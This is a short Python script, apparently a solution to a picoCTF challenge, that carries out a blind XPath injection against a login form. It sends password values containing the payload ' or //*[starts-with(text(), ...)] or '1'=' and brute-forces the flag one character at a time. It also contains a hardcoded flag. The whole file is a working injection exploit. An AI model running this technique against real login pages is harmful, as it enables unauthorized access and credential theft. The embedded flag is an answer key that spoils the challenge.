# XPATH injection
import string

import requests

BASE_URL = "http://mercury.picoctf.net:33594/"

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "}_!"

seen_password = ["picoCTF{"]
flag = "Payload: //*[starts-with(text(), 'picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_8d7f0533}i')]"
while True:
    for char in charset:
        trying_payload = "".join(seen_password) + char
        exploit = f"//*[starts-with(text(), '{trying_payload}')]"
        print(f"Payload: {exploit}")

        body = {"name": "admin", "pass": f"' or {exploit} or '1'='"}
        r = requests.post(BASE_URL, data=body)

        if "on the right path" in r.text:
            seen_password.append(char)
            print(f"seen pass: {seen_password}")
            break
